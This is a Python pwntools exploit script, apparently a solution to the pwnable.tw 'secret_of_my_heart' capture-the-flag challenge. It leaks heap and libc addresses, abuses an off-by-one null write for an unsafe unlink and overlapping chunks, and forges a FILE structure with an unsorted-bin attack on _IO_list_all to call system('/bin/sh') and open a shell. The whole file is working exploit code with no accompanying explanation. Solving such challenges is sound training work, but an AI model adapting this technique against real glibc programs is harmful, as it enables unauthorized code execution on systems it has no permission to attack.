from pwn import *
import sys
import ctypes

Host = 'chall.pwnable.tw'
Port = 10302

if len(sys.argv) == 1:
    r = process('./secret_of_my_heart', env={'LD_PRELOAD': './libc_64.so.6'})
else:
    r = remote(Host, Port)


def add_secret(size, name, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.send(name)
    r.recvuntil(':')
    r.send(content)

def show_secret(idx):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(idx))

def del_secret(idx):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))

libc = ELF('./libc_64.so.6')


add_secret(0x20, 'A'*0x20, 'Baka')
show_secret(0)
r.recvuntil('Name : ')
heap = u64(r.recvuntil(':')[32:38].ljust(8, '\x00')) - 0x10
log.info("heap: " + hex(heap))

add_secret(0x80, 'A', 'A')
add_secret(0xf0, 'A', '\x00'*0x10 + p64(heap+0x30))
add_secret(0x80, 'A', 'A')
del_secret(1)
add_secret(0x88, 'A',  p64(heap+0xe0-0x18) + p64(heap+0xe0-0x10) + 'A'*0x70 + p64(0x90))
del_secret(2)

show_secret(1)
r.recvuntil('Secret : ')
libc_base = u64(r.recvuntil('Secret of my heart')[:6].ljust(8,'\x00')) - 0x3c3b78
log.info("libc: " + hex(libc_base))

# consolidate all chunk
del_secret(0)
del_secret(3)

# create a chunk overlap secret[1], and fake its header
add_secret(0x40, 'A', '\x00'*0x28 + p64(0x81))
add_secret(0x80, 'A', '\x00'*0x58 + p64(0x71) + '\x00'*0x20)

payload = ''
# fake IO_objdect
payload += p64(heap+0x120) + p64(0)*3
payload += p64(1) + p64(0)*2
payload += p64(heap+0x150)

# fake wide_data and vtable 
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(0)*4
log.info('System offset: ' + hex(libc.symbols['system']))
payload += p64(libc_base+libc.symbols['system'])
payload = payload.ljust(0x80, '\x00')
add_secret(0x80, 'A', payload)

# fastbin size 0x80
del_secret(1)
# small bin size 0x90
del_secret(2)

payload = ""
payload += '\x00'*0x10
payload += '/bin/sh\x00' + p64(0x61)
payload += p64(libc_base+0x3c3b78) + p64(libc_base+libc.symbols['_IO_list_all']-0x10)
payload = payload.ljust(0x78, '\x00')

add_secret(0x78, 'A', payload)

r.recvuntil(':')
r.sendline('1')
r.recvuntil(':')
r.sendline(str(100))
r.recvuntil(':')
r.sendline('Baka')

r.interactive()

